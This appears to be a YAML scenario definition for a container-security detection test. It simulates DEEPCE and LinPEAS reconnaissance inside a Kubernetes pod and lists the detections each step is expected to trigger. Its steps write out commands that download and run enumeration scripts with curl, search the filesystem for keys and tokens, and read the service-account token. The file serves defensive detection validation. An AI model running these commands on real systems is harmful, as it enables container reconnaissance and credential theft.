scenario_id: SIM-CDR-001
name: "Container Enumeration via DEEPCE"
version: "1.0"
status: active

plane: CDR
detection_types:
  - BIOC

uc_ref: UCS-CDR-01
tc_ref: TC-CDR-01
tc_refs:
  - TC-CDR-01
  - TC-CITH-03
pov_scenario_id: POV-SC-054
uc_name: "Cloud Detection & Response"
tc_name: "Validate runtime threat detection for containers and serverless workloads"

mitre_tactic: "TA0007"
mitre_tactic_name: "Discovery"
mitre_technique: "T1613"
mitre_technique_name: "Container and Resource Discovery"
additional_techniques:
  - technique: "T1082"
    name: "System Information Discovery"

threat_report: "Unit42 - Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes"
threat_report_url: "https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/"

execution_identity:
  default: container-runtime
  options:
    - container-runtime
    - root
    - www-data

push_supported: true
pull_supported: true

# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
# Rolled out per the S-07 per-plane convention
# (docs/uc_tc_mapping/scenario-methodology-defaults.md). Defaults are not
# fabricated KPIs — they map this plane to the methodology family its
# detection shape already belongs to in the v2.0 master methodology.
validation_methodology: "Container Signal Injection & Detection Accuracy"
methodology_family: "F1"
primary_kpi: "MTTD"
threshold:
  kpi: "MTTD"
  op: "≤"
  value: 300
  unit: "seconds"
success_criteria: |
  The container/k8s TTP signals injected by this scenario produce the
  expected Cortex Cloud / XDR detections within the MTTD budget. Each
  expected_detections row is validated against the container runtime and
  cloud audit telemetry.
moat_tier: "LEAD"

external_tools:
  - name: DEEPCE
    source: "https://github.com/stealthcopter/deepce"
    type: script
    install_inline: false
    adapter_ref: TOOL-DEEPCE
  - name: deepce
    source: "https://github.com/stealthcopter/deepce"
    type: script
    install_inline: true
  - name: linpeas
    source: "https://github.com/carlospolop/PEASS-ng"
    type: script
    install_inline: true

# ── Causality contract ──────────────────────────────────────────────────────
# The pod's container runtime (containerd-shim → runc → container entrypoint
# shell) is the Causality Group Owner — the process that OWNS this in-container
# recon chain, NOT the cortexsim-agent beacon. Every recon step is a child of
# the same container entrypoint shell (shared container_id + causality actor),
# so the spine is a process_lineage chain: install deps → curl|bash DEEPCE →
# capability/device recon → service-account-token harvest → LinPEAS. The recon
# runs from the non-root container-runtime identity while the CGO stays root
# (the Linux privilege-drop-across-exec the sensor traces). platforms tag the
# Linux container env; step-04's k8s service-account-token read adds k8s.
cgo_anchor:
  image_name: "containerd-shim"
  primary_username: "root"

steps:
  - id: step-01
    name: "Install enumeration dependencies"
    command: |
      apt-get update -qq && apt-get install -y --no-install-recommends curl wget 2>/dev/null || \
      apk add --no-cache curl wget 2>/dev/null || \
      yum install -y curl wget 2>/dev/null; \
      echo "[*] Dependency install complete"
    identity: container-runtime
    mitre_technique: "T1059.004"
    platforms: ["linux", "container"]
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Package manager execution inside running container — unusual install pattern indicates post-exploitation activity"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-package-manager-execution-inside-running-container

  - id: step-02
    name: "Download and execute DEEPCE container enumeration tool"
    command: "curl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt"
    identity: container-runtime
    mitre_technique: "T1613"
    platforms: ["linux", "container"]
    causality:
      parent_step: step-01
      pivot: process_lineage
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "DEEPCE container enumeration script execution — known tool signature matched by CDR BIOC rule"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-deepce-container-enumeration-script-execution
      - plane: CDR
        type: BIOC
        description: "Suspicious curl download followed by bash execution in container context (curl-pipe-bash pattern)"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-curl-pipe-bash-download-execute-in-container

  - id: step-03
    name: "Check for privileged container escape vectors"
    command: "ls -la /dev/ | head -30 && echo '---' && cat /proc/1/status | grep -E 'CapEff|CapPrm' && echo '---' && mount | grep -E 'overlay|docker|k8s' && echo '---' && env | grep -iE 'kube|docker|container'"
    identity: container-runtime
    mitre_technique: "T1613"
    platforms: ["linux", "container"]
    causality:
      parent_step: step-02
      pivot: process_lineage
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Container privileged mode enumeration — /proc/1/status capability read indicating escape preparation"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-container-capability-mask-read-from-proc1-status
      - plane: CDR
        type: BIOC
        description: "Suspicious device enumeration and capability inspection sequence in container"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-container-device-enumeration-with-capability-inspection

  - id: step-04
    name: "Enumerate mounted secrets and service account tokens"
    command: "find / -name 'token' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -20 && ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50 && echo '[truncated for safety]'"
    identity: container-runtime
    mitre_technique: "T1552.001"
    platforms: ["linux", "container", "k8s"]
    causality:
      parent_step: step-03
      pivot: process_lineage
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "Service account token access from within container — credential harvesting behavior"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-service-account-token-access-from-container
      - plane: CDR
        type: BIOC
        description: "Broad filesystem credential search pattern (find / -name token) in container context"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-broad-filesystem-credential-search-in-container

  - id: step-05
    name: "Download and run LinPEAS for comprehensive container privilege escalation check"
    command: "curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | grep -E 'CVE|docker|container|cgroup|escape' | tee /tmp/linpeas_cdr_output.txt"
    identity: container-runtime
    mitre_technique: "T1082"
    platforms: ["linux", "container"]
    causality:
      parent_step: step-04
      pivot: process_lineage
    expected_detections:
      - plane: CDR
        type: BIOC
        description: "LinPEAS execution in container — post-exploitation privilege escalation tool signature"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-linpeas-privilege-escalation-tool-in-container
      - plane: CDR
        type: BIOC
        description: "Multiple system enumeration commands executed in sequence — automated discovery behavior"
        ttp_ref: "TTP-2026-0022"
        detection_id: bioc-cdr-001-automated-discovery-command-burst-in-container

cleanup:
  commands:
    - "rm -f /tmp/deepce.sh /tmp/deepce_output.txt /tmp/linpeas.sh /tmp/linpeas_cdr_output.txt"
    - "echo '[CortexSim] SIM-CDR-001 cleanup complete'"
  k8s_teardown: "kubectl delete -f {manifest_path}"

